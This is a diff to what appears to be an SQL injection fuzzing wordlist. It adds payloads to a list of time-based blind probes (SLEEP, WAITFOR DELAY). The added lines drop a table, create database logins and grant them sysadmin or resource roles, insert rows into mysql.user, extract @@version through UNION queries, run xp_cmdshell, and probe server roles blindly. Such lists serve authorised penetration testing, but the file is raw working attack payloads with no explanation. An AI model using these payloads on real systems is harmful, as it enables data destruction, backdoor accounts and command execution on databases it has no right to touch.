@@ -1,3 +1,4 @@
+
  and 1337=(select 1337 from (select sleep(120))A)
  and 1337=(select 1337 from (select sleep(120))A) -- 
  and sleep(120)
@@ -11,6 +12,7 @@
 ;WAITFOR DELAY '0:0:10'
 ;waitfor delay '0:0:10'--
 ;WAITFOR DELAY '0:0:10'--
+' ; drop table temp --
 ' AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND '1337' LIKE '1337
 ' AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND '1337'='1337
 ' AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) OR '1337'='1337
@@ -33,6 +35,11 @@
 ' and sleep(10)--
 ' AND SLEEP(10)#
 ' and sleep(120) -- 
+' exec sp_addsrvrolemember 'name' , 'sysadmin' --
+' grant connect to name; grant resource to name; --
+' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --
+' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+' or 1=1 --
 ' or 1337=(select 1337 from (select sleep(120))A) -- 
 ' OR SLEEP(10)#
 ' or sleep(120) -- 
@@ -41,6 +48,12 @@
 ' RLIKE SLEEP(10) OR '1337'='1337
 ' RLIKE SLEEP(10)--
 ' RLIKE SLEEP(10)-- 1337
+' union (select @@version) --
+' union (select NULL, (select @@version)) --
+' union (select NULL, NULL, (select @@version)) --
+' union (select NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
 ' WAITFOR DELAY '0:0:10'
 ' WAITFOR DELAY '0:0:10'--
 ' WHERE 1337=1337 AND ELT(1337=1337,SLEEP(10))-- 1337
@@ -49,6 +62,15 @@
 '-case when 2000=2000 then sleep(3) else 0 end-'
 '-if(1=1,benchmark(10000000,sha(1)),1)-'
 '-if(1=1,sleep(3),1)-'
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- 
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --
+'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --
+'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --
 ';%5waitfor%5delay%5'0:0:10'%5--%5
 ';select sleep(120) -- 
 ';waitfor delay '0:0:10'--
@@ -109,6 +131,9 @@
 'and sleep(3)--%20123
 'and sleep(3)--+123
 'and sleep(3)#
+'create user name identified by 'pass123' --
+'create user name identified by pass123 temporary tablespace temp default tablespace users; 
+'exec sp_addlogin 'name' , 'password' --
 " AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND "1337" LIKE "1337
 " AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND "1337"="1337
 " AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337
